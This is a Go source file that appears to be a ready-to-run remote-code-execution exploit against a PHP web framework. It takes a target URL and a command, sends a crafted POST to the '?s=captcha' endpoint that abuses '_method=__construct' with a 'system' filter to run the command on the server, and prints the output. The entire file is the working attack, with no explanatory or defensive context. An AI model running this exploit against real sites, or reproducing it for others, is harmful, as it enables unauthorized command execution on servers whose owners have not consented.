package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Printf("Usage: %s <url> <command>\n", os.Args[0])
		os.Exit(1)
	}

	baseURL := os.Args[1]
	command := os.Args[2]

	targetURL := strings.TrimRight(baseURL, "/") + "/index.php?s=captcha"

	payload := url.Values{}
	payload.Set("_method", "__construct")
	payload.Add("filter[]", "system")
	payload.Set("method", "get")
	payload.Set("server[REQUEST_METHOD]", command)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.PostForm(targetURL, payload)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	fmt.Println(string(body))
}
